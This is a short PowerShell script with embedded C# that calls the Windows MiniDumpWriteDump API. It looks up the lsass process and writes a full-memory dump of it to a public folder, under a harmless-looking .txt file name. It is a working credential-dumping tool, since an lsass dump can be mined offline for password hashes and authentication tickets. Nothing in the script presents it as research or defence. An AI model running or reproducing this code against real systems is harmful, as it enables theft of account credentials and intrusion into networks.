Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class MiniDump {
    [Flags]
    public enum Option : uint {
        Normal = 0x00000000,
        WithDataSegs = 0x00000001,
        WithFullMemory = 0x00000002,
        WithHandleData = 0x00000004,
        FilterMemory = 0x00000008,
        ScanMemory = 0x00000010,
        WithUnloadedModules = 0x00000020,
        WithIndirectlyReferencedMemory = 0x00000040,
        FilterModulePaths = 0x00000080,
        WithProcessThreadData = 0x00000100,
        WithPrivateReadWriteMemory = 0x00000200,
        WithoutOptionalData = 0x00000400,
        WithFullMemoryInfo = 0x00000800,
        WithThreadInfo = 0x00001000,
        WithCodeSegs = 0x00002000,
        WithoutAuxiliaryState = 0x00004000,
        WithFullAuxiliaryState = 0x00008000,
        WithPrivateWriteCopyMemory = 0x00010000,
        IgnoreInaccessibleMemory = 0x00020000,
        ValidTypeFlags = 0x0003ffff,
    }

    [DllImport("Dbghelp.dll")]
    private static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        uint processId,
        IntPtr hFile,
        Option dumpType,
        IntPtr exceptionParam,
        IntPtr userStreamParam,
        IntPtr callbackParam
    );

    public static void Dump(string path, int processId) {
        using (Process process = Process.GetProcessById(processId)) {
            using (var fileStream = new System.IO.FileStream(path, System.IO.FileMode.Create)) {
                MiniDumpWriteDump(
                    process.Handle,
                    (uint)processId,
                    fileStream.SafeFileHandle.DangerousGetHandle(),
                    Option.WithFullMemory,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero
                );
            }
        }
    }
}
"@

$dumpPath = "C:\users\public\test123.txt"
$abcd = Get-Process lsass
[MiniDump]::Dump($dumpPath, $abcd.Id)
